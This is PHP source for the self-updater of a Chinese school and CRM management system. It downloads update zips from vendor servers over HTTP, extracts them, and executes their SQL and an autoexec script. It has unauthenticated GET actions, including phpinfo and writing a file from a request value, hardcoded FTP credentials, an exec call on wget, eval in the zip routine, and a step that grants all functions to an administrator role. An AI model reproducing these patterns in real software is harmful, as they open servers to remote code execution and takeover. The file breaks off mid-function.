<?php
ini_set('date.timezone','Asia/Shanghai');
ini_set('display_errors', 1);
ini_set('error_reporting', E_ALL);
// display warnings and errors
error_reporting(E_WARNING | E_ERROR);
@set_time_limit(120000);
session_start();
header("Content-Type: text/html; charset=gb2312") ;
$isBase64 = isBase64();
//进行_GET变量转换
$isBase64==1?CheckBase64():'';

$SERVER_NAME = $_SERVER['SERVER_NAME'];

require_once('../adodb/adodb.inc.php');
require_once('../config.inc.php');
require_once('../setting.inc.php');
require_once('../Enginee/lib/function_system.php');

$SYSTEM_DEBUG_SQL = "0";

//软件类型
$PHP_SELF_ARRAY = explode('/',$_SERVER['PHP_SELF']);
array_pop($PHP_SELF_ARRAY);
array_shift($PHP_SELF_ARRAY);
if(in_array("TDLIB",$PHP_SELF_ARRAY))		{
	$RemoteHostName = "down.tongda2000.com/OA_train/通达OA可选组件/收费组件-试用版/通达OA教育管理组件/updatepacketcrm2012";
	$RemoteHostNameURL = "http://edu.tongda2000.com/updatepacket/tdeducrm.php";
	$通达数字化校园 = "单点CRM系统"; 
	$本次更新内容 = "http://www.dandian.net/crm/updatelog.php";
}
elseif(in_array("ERP",$PHP_SELF_ARRAY))		{
	$RemoteHostName = "www.dandian.net/download/updatepacket/tdcrm_download.php?FILENAME";
	$RemoteHostNameURL = "http://www.dandian.net/download/updatepacket/tdeducrm.php";
	$通达数字化校园 = "单点CRM系统";
	$本次更新内容 = "http://www.dandian.net/crm/updatelog.php";
}
elseif(in_array("WUYE",$PHP_SELF_ARRAY))		{
	$RemoteHostName = "down.tongda2000.com/OA_train/通达OA可选组件/收费组件-试用版/通达OA教育管理组件/updatepacketwuye";
	$RemoteHostNameURL = "http://edu.tongda2000.com/updatepacket/tdeducrm.php";
	$通达数字化校园 = "单点物业系统";
	$本次更新内容 = "http://www.dandian.net/wuye/updatelog.php";
}
else	{
	$RemoteHostName = "down.tongda2000.com/OA_train/通达OA可选组件/收费组件-试用版/通达OA教育管理组件/updatepacket";
	$RemoteHostNameURL = "http://edu.tongda2000.com/updatepacket/tdeducrm.php";
	$通达数字化校园 = "通达数字化校园";
	$本次更新内容 = "http://www.dandian.net/product/updatelog.php";
}
//print $RemoteHostNameURL;

if($_GET['action']=="")                                {
	print "<link rel=stylesheet href=\"".ROOT_DIR."theme/3/style.css\"><body class=bodycolor><title>$通达数字化校园 - 更新程序</title>";
	$Text = "<font color=red>正在从通达中部研发中心服务器(www.dandian.net)上面下载可用更新文件列表....<BR>更新包用法:更新安装包以日期时间命名,时间早的先的安装,时间晚的后安装.<BR>(注意:所有的安装包都需要进行安装)</font><BR>";
	//$Text .= "<font color=red><input class=SmallButton type=button value='如果update.php版本比较旧，点击更新update.php版本' OnClick=\"location='?action=updateSelfFile&RemoteHostName=".$RemoteHostName."'\" /></font><BR><BR>";
	tableFilterContent($Text,600);
	print "<BR>";
	$ini_get_all	= ini_get_all();
	$global_value	= $ini_get_all['safe_mode']['global_value'];

	$CheckFile = @file($RemoteHostNameURL);
	if($CheckFile[0]=="")	$CheckFile = @file($RemoteHostNameURL);
	if($CheckFile[0]=="")	$CheckFile = @file($RemoteHostNameURL);

	if($CheckFile[0]==""&&$global_value!=1&&is_file("wget.exe"))				{
		//下载数据为空,使用WGET方式下载需要文件
		@unlink('hostlist2010.php');
		@exec("wget.exe -q $RemoteHostNameURL");
		$CheckFile = @file('hostlist2010.php');
		$SYSTEM_WGET_DOWNLOAD = "1";
	}
	else	{
		$SYSTEM_WGET_DOWNLOAD = "0";
	}
	//print_R($CheckFile);
	//exec("mkdir D:/MYOA/webroot/general/EDU/databackup/110");
	/*
	$SCRIPT_FILENAME_ARRAY = explode('/',$_SERVER['SCRIPT_FILENAME']);
	array_pop($SCRIPT_FILENAME_ARRAY);
	$SCRIPT_FILENAME_TEXT = join('/',$SCRIPT_FILENAME_ARRAY);
	//print_R($SCRIPT_FILENAME_ARRAY);
	print $命令行 = $SCRIPT_FILENAME_TEXT."/wget.exe -q $RemoteHostNameURL -P $SCRIPT_FILENAME_TEXT";
	exec($命令行);


	//exit;
	//定义CURL,如果CURL存在,则用CURL模块
	if(function_exists("curl_init"))				{
		ob_start();
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $RemoteHostNameURL);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_exec($ch);
		$CheckFile = ob_get_contents();
		$CheckFile = explode("\n",TRIM($CheckFile));
		ob_end_clean();
		curl_close($ch);//exit;
	}
	else		{
		$CheckFile = @file($RemoteHostNameURL);
		if($CheckFile[0]=="")
			$CheckFile = @file($RemoteHostNameURL);
		if($CheckFile[0]=="")
			$CheckFile = @file($RemoteHostNameURL);
		if($CheckFile[0]=="")
			$CheckFile = @file($RemoteHostNameURL);
	}
	*/

	//print_R($CheckFile);exit;

	if($CheckFile[0]=="")        {
		print "<table width='600'  border='0' align='center' cellpadding='0' cellspacing='0' class='small' style='border:1px solid #006699;'><tr><td align='center' valign='middle' height=50>";
		print "<BR><font color=red>更新服务器无响应,请多刷新几次或换个时间进行升级操作<BR></font><BR>";
		print "</td></tr></table>";
		exit;
	}


	$ReadZipFileList = ReadZipFileList(".");
	//print_R($ReadZipFileList);
	$dirlist = array_reverse ($ReadZipFileList['dirList']);
	$fileSizeList = $ReadZipFileList['fileSizeList'];
	//print_R($dirlist);
	for($i=0;$i<sizeof($dirlist);$i++)        {
		$upateName = $dirlist[$i];
		$IndexName = sizeof($dirlist)-1;
		$TempFileName = is_file($upateName.".zip.txt");
		$TempFileName = (int)$TempFileName;
		if($i==$IndexName)        {
			$fileURL[] = $dirlist[$i].":".$fileSizeList[$upateName].":".$TempFileName."\n";
		}
		else    {
			$fileURL[] = $dirlist[$i].":".$fileSizeList[$upateName].":".$TempFileName."";
		}
	}

	$UpdateFile = @file("update.txt");
	$UpdateDate = $UpdateFile[0];
	//print $UpdateDate;print_R($CheckFile);print $RemoteHostNameURL;
	//exit;



	$PacketInforArray = $fileURL;
	$PacketInforUpdate = $UpdateFile[0];
	//print_R($PacketInforArray);
	$PacketName = array();
	$PacketNameSize = array();
	$PacketNameUpdate = array();
	for($i=0;$i<sizeof($PacketInforArray);$i++)                {
		$ElementArray = explode(':',$PacketInforArray[$i]);
		$PacketName = $ElementArray[0];
		$PacketSize = $ElementArray[1];
		$PacketUpdate = $ElementArray[2];
		$PacketNameArray[$i] = $PacketName;
		$PacketNameSize[$PacketName] = TRIM($PacketSize);
		$PacketNameUpdate[$PacketName] = TRIM($PacketUpdate);
	}
	//print_R($PacketNameUpdate);

	//exit;
	//得到可以利用的主机的名称
	$file = $CheckFile;
	//print_R($file);
	//确实现在是哪一个更新包可以进行安装
	for($i=0;$i<sizeof($file);$i++)                {
		$ElementArray = explode('||',$file[$i]);
		$fileName = (int)$ElementArray[1];
		$TempFileName = is_file($fileName.".zip.txt");

		$fileDate = $PacketInforUpdate; //得到系统安装包的更新日期
		if($fileDate=="")	$fileDate = (int)$fileURL[0];
		if($fileName>$fileDate)                        {
			if(!$TempFileName) $INSTALL_PACKET_NAME = $fileName;
		}
	}
	//print $INSTALL_PACKET_NAME;
	for($i=0;$i<sizeof($file);$i++)                {

		//第一台主机下载
		$ElementArray = explode('||',$file[$i]);
		//分离主机名
		$hostName = $RemoteHostName;        //print "主机名：".$hostName."<BR>";
		//分离下载的文件名
		$fileName = $ElementArray[1];        //print "文件名：".$fileName."<BR>";
		$RemoteSize = TRIM($ElementArray[2]);

		//得到系统安装包的更新日期
		//$fileDate = file("update.txt");
		$fileDate = $PacketInforUpdate;
		//print $fileName;
		//print $fileDate."<HR>";
		if($fileDate=="")        {
			$fileDate = $fileURL[0];
		}

		if($fileName>$fileDate)                        {
		//形成URL
		$URL = "http://$RemoteHostName=".$fileName;
		//print $URL;exit;

		//清理已经解压到EDU目录下面的SQL文件
		if(@is_file("../".$fileName.".sql"))			{
			@unlink("../".$fileName.".sql");
		}

		//得到文件状态
		if(@in_array($fileName,$PacketNameArray))        {
			$Status = "<font color=green>文件已下载</font>";
			$LocalSize = $PacketNameSize[$fileName];
			//print $RemoteSize."||".$LocalSize."<HR>";
			if(TRIM($RemoteSize)==TRIM($LocalSize))        {
				$Status .= "[<font color=green>文件完整</font>]";
				$FILE_EXEC = 1;
			}
			else    {
				$Status .= "[<font color=red>文件缺失</font>]";
				$FILE_EXEC = 0;
			}
		}
		else        {
			$Status = "<font color=red>文件没有下载</font>";
			$FILE_EXEC = 0;
		}
		//print $FILE_EXEC;
		$RemoteSize = $ElementArray[2];
		//print_R($ElementArray);

		if($FILE_EXEC=="1")                        {
			//print_R($PacketNameUpdate);
			if($PacketNameUpdate[$fileName]=="1")        {
				$ReDownload = "<a href=?".base64_encode("action=ExecRemoteFileServer&FileName=$fileName&RemoteHostName=".$RemoteHostName."")."><font color=003399 title='已安装,点击重新安装'>已安装,点击重新安装</font></a>";
			}
			else    {
				if($INSTALL_PACKET_NAME==$fileName)		{
					$ReDownload = "<a href=?".base64_encode("action=ExecRemoteFileServer&FileName=$fileName&RemoteHostName=".$RemoteHostName."")."><font color=red>点击安装更新包文件</font></a>";
				}
				else			{
					$ReDownload = "<font color=orange>请先安装日期最前的更新包</font>";
				}
			}
			//$ReDownload = '';
		}
		else        {
			$TargetFtpServer = $RemoteHostName;
			$DefaultFtpServer = $SERVER_NAME;
			$ReDownload = "<a href=?".base64_encode("action=downloadRemoteFile&FileName=$fileName&RemoteHostName=".$RemoteHostName."&SYSTEM_WGET_DOWNLOAD=1")."><font color=green>点击下载更新包文件HTTP</font></a>";

			//$ReExec = '';
		}
		//print "远程文件大小：$RemoteSize<BR>";
		//print "本地文件大小：$LocalSize<BR>";
		$text .= "<tr height=25><td align='middle'>更新包文件：$fileName</td> <td align='left'>大小：".$RemoteSize."B</td> <td align='left' nowrap><div id=ElementStatus".$i."></div></td><td align='left'><div id=ElementReDownload".$i."></div></td>
		<td align='left'><a href='".$本次更新内容."#".$fileName."' target=_blank><font color=green>本次更新内容</font></a></td>
		</tr>\n";
		$text .= "<script>ElementStatus".$i.".innerHTML=\"状态:$Status\";</script>\n";
		$text .= "<script>ElementReDownload".$i.".innerHTML=\"$ReDownload\";</script>\n";
		$GLOBAL_URL[$fileName] = $URL;
		}//日期比较结束
	}
	if($text=="")            {
		$text .= "<BR><font color=red>现有系统为最新版本,没有可用于更新的更新包!</font><BR><BR>\n";
	}
	tableFilterContent($text,600);

    print "<BR><table width='600'  border='0' align='center' cellpadding='0' cellspacing='0' class='small' style='border:1px solid #006699;'>
	<tr><td align='center' height=60 valign='middle'>";
    print "<a href='http://edu.tongda2000.com' target=_blank><font color=green>$通达数字化校园 发行单位:郑州单点科技软件有限公司 http://edu.tongda2000.com</font></a>
	<BR><BR>
	如果您是正版用户,请联系QQ:83102413,取得软件授权书及使用手册";

    print "</td></tr></table>";



}




//TEST
//print "<form name=form1 method=POST action=\"?action=UpdateFilePassToPostMethod\"  enctype=multipart/form-data><tr width=100% class=TableData><td valign=top width=\"100%\" align=left class=TableData><input type=file name=FileName class=Smallinput size=15><input type=submit value=上传相片 name=send class=SmallButton></td></tr></form>";
//exit;
//#############################################################################
//通过POST上传安装包文件
//#############################################################################
/*
if($_GET['action']=="UpdateFilePassToPostMethod"&&$RemoteHostName!="")                {
    $name=$_FILES['filename']['name'];
    $type=$_FILES['filename']['type'];
    $tmp_name=$_FILES['filename']['tmp_name'];
    $error=$_FILES['filename']['error'];
    copy($tmp_name,$name);
    //print_R($_FILES);
    //print_R($_POST);
    echo "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=?RemoteHostName=".$RemoteHostName."'>\n";
    exit;
    //exit;
}
*/

//#############################################################################
//设定更新时间
//#############################################################################
if($_GET['action']=="SetUpdateTxt")                {
    if($_GET['update']!="")        {
        writeFileRemote("update.txt",$_GET['update'],"update.txt的值设定为".$_GET['update']);
        exit;
    }
}

function ReadZipFileList($testdir)                    {
    global $SYSTEMDOCLINK;
    $d=opendir($testdir."/");
    $dirList  = array();
    $fileSizeList = array();
    while($file=readdir($d)){
        if($file!='.'&&$file!='..'&&$file!='')        {
            $path=$testdir."/".$file;
            if(is_file($path))        {
                //print $path."DIR<BR>";
                if(substr($file,0,2)=="20"&&substr($file,-3)=="zip")        {
                    $filesize = filesize($path);
                    $file = substr($file,0,-4);
                    $fileSizeList[$file] = $filesize;
                    array_push($dirList,$file);
                }
            }
        }
    }//end while
    //asort($dirList);
    $return['dirList'] = $dirList;
    $return['fileSizeList'] = $fileSizeList;
    return $return;
}
//#############################################################################
//更新包状态结束
//#############################################################################

if($_GET['action']=="phpinfo")                {
    //exec("cat /etc/host.conf",$array1);
    //exec("cat /etc/nsswitch.conf",$array2);
    //exec("ifconfig eth0",$array);
    //print_R($array1);print_R($array2);print_R($array);
    phpinfo();
    exit;
}


if($_GET['action']=="downloadRemoteFile"&&$_GET['FileName']!="")        {

	$FILENAME = $_GET['FileName'];
	$URL = $GLOBAL_URL[$FILENAME];
	$URL = "http://$RemoteHostName=".$FILENAME;
	if($_GET['SYSTEM_WGET_DOWNLOAD']=="1")		{
		//unlink($FILENAME.".zip");
		//exec("wget.exe -q $URL");
		//exit;
	}
	else		{
		//$TEXT = readFileRemote($URL);//exit;
		//writeFileRemote($FILENAME.".zip",$TEXT);
	}
	$TEXT = readFileRemote($URL);//exit;
	writeFileRemote($FILENAME.".zip",$TEXT);
	//删除安装标记
	@unlink($FILENAME.".zip.txt");
	echo "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=?".base64_encode("RemoteHostName=".$RemoteHostName."")."'>\n";
	exit;
}//下载文件部分完成

//ExecRemoteFile&FileName=20080126&RemoteHostName=wgyxx.zg163.net
//调用远程服务器上面的程序执行解压操作

if($_GET['action']=="ExecRemoteFileServerEXESQL"&&$_GET['FileName']!=""&&$RemoteHostName!="")        {
    $dir = '.';                //文件地址所在
    $key = '../';            //解压文件目录

    print "<table width=100% border=0 align=center ><tr><td wrap width=100%>\n";

    $FileName = $_GET['FileName'];

    if(file_exists($key.$FileName.".sql"))    {
        require_once('../adodb/adodb.inc.php');
        require_once('../config.inc.php');
        require_once('../setting.inc.php');
        $rs = $db->Execute("set names gbk");
        $file = @file($key.$FileName.".sql");
		for($index=0;$index<count($file);$index++)
		{
			if(cutStr(trim($file[$index]),2)=='--')
				$file[$index]='';
		}
        $fileText = join('',$file);
        $FileArray = explode(";\r\n",$fileText);
		print "<BR>第二步:执行SQL语句:<BR>";
        for($i=0;$i<sizeof($FileArray);$i++)        {
            $sql = TRIM($FileArray[$i]);
            //print "<BR>".$sql;
			if($sql=="SET USER PRIV ALL")		{
				$sql = "select FUNC_ID from TD_OA.sys_function";
				$rs = $db->Execute($sql);
				$rs_a = $rs->GetArray();
				$NewText = '';
				for($iX=0;$iX<sizeof($rs_a);$iX++)		{
					$FUNC_ID = $rs_a[$iX]['FUNC_ID'];
					$NewText .= "$FUNC_ID,";
				}
				$sql = "update TD_OA.user_priv set FUNC_ID_STR='$NewText' where USER_PRIV='1'";
				$rs = $db->Execute($sql);
				//print $sql;exit;
			}
			else	{
				 $sql = $FileArray[$i];
				 $sql = ereg_replace('；',';',$sql);
				 //$sql = ereg_replace('','',$sql);
				 //$sql = ereg_replace('','',$sql);
				 //$sql = ereg_replace('','',$sql);
				$rs = $db->Execute($sql);
			}
			print $i."&nbsp;";
			if($i>0&&$i%20==0)		print "<BR>";
            //print $rs->EOF;
        }
    }
	if(file_exists($key.$FileName.".sql"))				{
		//unlink($key.$FileName.".sql");
	}
    print "<font color=red>文件解压完成</font>";
    print "</td></tr></table>\n";

	//加载执行新的执行语句
	if(@is_file("autoexec.php")&&@is_file("autoexec.php"))			{
		include("autoexec.php");
		@unlink("autoexec_do.php");
		@rename("autoexec.php","autoexec_do.php");
	}

	//重写菜单文件
	include "make_sys_function_file.php";
    echo "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=?'>\n";

    exit;
}


if($_GET['action']=="ExecRemoteFileServer"&&$_GET['FileName']!=""&&$RemoteHostName!="")        {
    $dir = '.';                //文件地址所在
    $key = '../';            //解压文件目录

    print "<table width=100% border=0 align=center ><tr><td wrap width=100%>\n";

    $FileName = $_GET['FileName'];
    if(file_exists($FileName.".zip"))    ExactFile($FileName.".zip");
	echo "<script language=javascript>location='?".base64_encode("action=ExecRemoteFileServerEXESQL&FileName=".$_GET['FileName']."&FileName=".$_GET['FileName']."&RemoteHostName=".$RemoteHostName)."'</script>\n";
	//echo "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=?action=ExecRemoteFileServerEXESQL&FileName=".$_GET['FileName']."&FileName=".$_GET['FileName']."&RemoteHostName=".$RemoteHostName."'>\n";
	exit;
	/*
    if(file_exists($key.$FileName.".sql"))    {
        require_once('../adodb/adodb.inc.php');
        require_once('../config.inc.php');
        require_once('../setting.inc.php');
        $rs = $db->Execute("set names gbk");
        $file = @file($key.$FileName.".sql");
        $fileText = join('',$file);
        $FileArray = explode(';',$fileText);
		print "<BR>第二步:执行SQL语句:<BR>";
        for($i=0;$i<sizeof($FileArray);$i++)        {
            $sql = TRIM($FileArray[$i]);
            //print "<BR>".$sql;
			if($sql=="SET USER PRIV ALL")		{
				$sql = "select FUNC_ID from TD_OA.sys_function";
				$rs = $db->Execute($sql);
				$rs_a = $rs->GetArray();
				$NewText = '';
				for($iX=0;$iX<sizeof($rs_a);$iX++)		{
					$FUNC_ID = $rs_a[$iX]['FUNC_ID'];
					$NewText .= "$FUNC_ID,";
				}
				$sql = "update TD_OA.user_priv set FUNC_ID_STR='$NewText' where USER_PRIV='1'";
				$rs = $db->Execute($sql);
				//print $sql;exit;
			}
			else	{
				 $sql = $FileArray[$i];
				 //$sql = ereg_replace('','',$sql);
				 //$sql = ereg_replace('','',$sql);
				 //$sql = ereg_replace('','',$sql);
				 //$sql = ereg_replace('','',$sql);
				$rs = $db->Execute($sql);
			}
			print $i."&nbsp;";
			if($i>0&&$i%20==0)		print "<BR>";
            //print $rs->EOF;
        }
    }
	if(file_exists($key.$FileName.".sql"))				{
		unlink($key.$FileName.".sql");
	}
    print "<font color=red>文件解压完成</font>";
    print "</td></tr></table>\n";

	//加载执行新的执行语句
	if(@is_file("autoexec.php")&&@is_file("autoexec.php"))			{
		include("autoexec.php");
		@unlink("autoexec_do.php");
		@rename("autoexec.php","autoexec_do.php");
	}

	//重写菜单文件
	include "make_sys_function_file.php";
    echo "<META HTTP-EQUIV=REFRESH CONTENT='2;URL=?'>\n";
	*/
    exit;
}






function tableFilterContent($Text,$width=800)        {
    print "<table width='$width'  border='0' align='center' cellpadding='0' cellspacing='0' class='small' style='border:1px solid #006699;'><tr><td align='center' valign='middle'>$Text</td></tr></table>";
}

//函数区域################################################################
function writeFileRemote($filename,$text,$return='HTTP下载文件完成')        {
    if(strlen($text)==0)    return;
    @!$handle = fopen($filename, 'w');
    if (!fwrite($handle, $text)) {
        exit;
        }
    fclose($handle);
    print "<div align=center>$return</div>";
}

function readFileRemote($filename)        {
    $handle = fopen ($filename, "rb");
    $contents = "";
    do {
        $data = fread($handle, 8192);
        if (strlen($data) == 0) {
         break;
        }
        $contents .= $data;
    } while(true);
    fclose ($handle);
    return $contents;
}


function readFileFtp($fileName,$hostName)                {
    if(substr($hostName,0,4)=="www.")        {
        $hostName = substr($hostName,4,strlen($hostName));
    }
    $hostNameArray = explode(':',$hostName);
    $ftp_server = $hostNameArray[0];
    $ftp_port = "21";
    $ftp_user_name = "Admin";
    $ftp_user_pass = "SmartAdmin";
    $local_file = $fileName;
    $server_file = $fileName;
    // connect to the FTP server
    $conn_id = ftp_connect($ftp_server,$ftp_port);
    $login_result = ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);
    $somedir = "$ftp_server/web/databackup/";
    ftp_chdir($conn_id, $somedir);
    // try to download
    if (ftp_get($conn_id, $local_file, $server_file, FTP_BINARY)) {
        echo "FTP成功下载文件:$local_file\n";
    } else {
        echo "FTP下载文件失败!\n";
    }
}



function ExactFile($fileName)        {
        global $dir,$key;
        echo "<font color=green size=1>以下为文件的复制进度，编号代表文件复制的个数(第一步)：</font><BR>";
        $zip = new Zip;
        $zipfile=$dir."/".$fileName;
        $array=$zip->get_list($zipfile);
        $count=count($array);
        $f=0;
        $d=0;
        for($i=0;$i<$count;$i++) {
            if($array[$i][folder]==0) {
                if($zip->Extract($zipfile,$key,$i)>0) $f++;
            }
            else $d++;
            if($i%15==0&&$i>1) $br = "<BR>";
            else $br = '　　';
            print "<font color=green size=1>".$i.$br."</font>";
        }
        if($i==($f+$d)&&$i>0)    {
            echo "<BR><font color=green size=1>$fileName 解压成功<br>($f 个文件 $d 个目录)</font><BR>";
			$goalfile = $fileName.".txt";
			if(is_file($goalfile))    {
				unlink($goalfile);
			}
			$string ="本更新包已经更新";
			@!$handle = fopen($goalfile, 'w');
			if (!fwrite($handle, $string)) {
				exit;
			}
			fclose($handle);
			print "<BR><font color=orange size=1>$string</font>";
        }
        elseif(($f+$d)==0)    {
			$goalfile = $fileName.".txt";
			if(is_file($goalfile))    {
				unlink($goalfile);
			}
            echo "<BR><font color=red size=1>$fileName 解压失败,如果出现错误,请与你的空间商联系,核实是否有相关权限.</font><BR>";
        }
        else		{
			echo "<BR><font color=orange size=1>$fileName 未解压完整<br>(已解压 $f 个文件 $d 个目录)</font><BR>";
		}
        //echo "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=?action=setting&RemoteHostName=".$RemoteHostName."'>\n";
        //确定更新记录######################################################

}

//#####################################################################################
//#####################################################################################
//#####################################################################################
//以下是类及函数定义
class Zip //ZIP压缩类
{

 var $datasec, $ctrl_dir = array();
 var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
 var $old_offset = 0; var $dirs = Array(".");

 function get_List($zip_name)
 {
   $zip = @fopen($zip_name, 'rb');
   if(!$zip) return(0);
   $centd = $this->ReadCentralDir($zip,$zip_name);

    @rewind($zip);
    @fseek($zip, $centd['offset']);

   for ($i=0; $i<$centd['entries']; $i++)
   {
    $header = $this->ReadCentralFileHeaders($zip);
    $header['index'] = $i;$info['filename'] = $header['filename'];
    $info['stored_filename'] = $header['stored_filename'];
    $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
    $info['crc'] = strtoupper(dechex( $header['crc'] ));
    $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
    $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
    $info['index'] = $header['index'];$info['status'] = $header['status'];
    $ret[]=$info; unset($header);
   }
  return $ret;
 }
 function Add($files,$compact)
 {
  if(!is_array($files[0])) $files=Array($files);

  for($i=0;$files[$i];$i++){
    $fn = $files[$i];
    if(!in_Array(dirname($fn[0]),$this->dirs))
     $this->add_Dir(dirname($fn[0]));
    if(basename($fn[0]))
     $ret[basename($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
  }
  return $ret;
 }

 function get_file()
 {
   $data = implode('', $this -> datasec);
   $ctrldir = implode('', $this -> ctrl_dir);

   return $data . $ctrldir . $this -> eof_ctrl_dir .
    pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 }

 function add_dir($name)
 {
   $name = str_replace("\\", "/", $name);
   $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";

   $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) );
   $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0);
   $this -> datasec[] = $fr;

   $new_offset = strlen(implode("", $this->datasec));

   $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";
   $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) );
   $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 );
   $ext = "\xff\xff\xff\xff";
   $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name;

   $this -> ctrl_dir[] = $cdrec;
   $this -> old_offset = $new_offset;
   $this -> dirs[] = $name;
 }

 function add_File($data, $name, $compact = 1)
 {
   $name     = str_replace('\\', '/', $name);
   $dtime    = dechex($this->DosTime());

   $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
     . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
   eval('$hexdtime = "' . $hexdtime . '";');

   if($compact)
   $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
   else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
   $unc_len = strlen($data); $crc = crc32($data);

   if($compact){
     $zdata = gzcompress($data); $c_len = strlen($zdata);
     $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
   }else{
     $zdata = $data;
   }
   $c_len=strlen($zdata);
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;

   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);

   $this -> datasec[] = $fr;
   $new_offset        = strlen(implode('', $this->datasec));
   if($compact)
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
   else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
   $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
   $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
   $cdrec .= pack('V', $this -> old_offset );

   $this -> old_offset = $new_offset;
   $cdrec .= $name;
   $this -> ctrl_dir[] = $cdrec;
   return true;
 }

 function DosTime() {
   $timearray = getdate();
   if ($timearray['year'] < 1980) {
     $timearray['year'] = 1980; $timearray['mon'] = 1;
     $timearray['mday'] = 1; $timearray['hours'] = 0;
     $timearray['minutes'] = 0; $timearray['seconds'] = 0;
   }
   return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) |     ($timearray['mday'] << 16) | ($timearray['hours'] << 11) |
    ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
 }

 function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
     if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
      return(-1);
   }

   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
      $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);

   }
   fclose($zip);
   return $stat;
 }

  function ReadFileHeader($zip)
  {
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }

 function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

    if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';

    if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';

    if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';

    if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }

 function ReadCentralDir($zip,$zip_name)
 {
  $size = filesize($zip_name);
  if ($size < 277) $maximum_size = $size;
  else $maximum_size=277;

  @fseek($zip, $size-$maximum_size);
  $pos = ftell($zip); $bytes = 0x00000000;

  while ($pos < $size)
  {
